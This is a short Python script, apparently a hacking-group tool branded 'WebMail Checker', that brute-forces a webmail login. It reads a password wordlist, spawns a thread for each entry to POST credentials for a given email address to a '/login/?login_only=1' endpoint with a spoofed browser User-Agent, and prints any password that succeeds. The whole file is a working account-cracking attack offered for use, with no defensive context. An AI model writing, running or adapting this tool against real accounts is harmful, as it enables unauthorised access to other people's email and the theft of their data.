from colorama import *
import requests
import sys
import threading

init(autoreset=True)

banner = Fore.GREEN + """
           _    ____ _____ __  __    _    ___ _     
          / \  / ___| ____|  \/  |  / \  |_ _| |   
         / _ \| |   |  _| | |\/| | / _ \  | || |    www.imhatimi.org ~ ACEVeen
        / ___ \ |___| |___| |  | |/ ___ \ | || |___        WebMail Checker
       /_/   \_\____|_____|_|  |_/_/   \_\___|_____|
    Usage: python3 main.py <URL> <MAIL> <WORDLIST>
"""
print(banner)

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd"
}

url, mail, password = sys.argv[1], sys.argv[2], sys.argv[3]

wordlist = open(password, 'r').readlines()

def brute(password):
    data = {
        'user': mail,
        'pass': password.strip(),
        'goto_url': '/'
    }
    fixed_url = url + "/login/?login_only=1"

    req = requests.post(fixed_url, data, headers=header)
    txt = req.text

    if '"status":1,' in txt:
        print(Fore.LIGHTGREEN_EX + f"    Login Successful! Mail: {mail} Password: {password.strip()}")
    else:
        print(Fore.LIGHTRED_EX + "    Login Failed!")

threads = []
for line in wordlist:
    t = threading.Thread(target=brute, args=(line,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
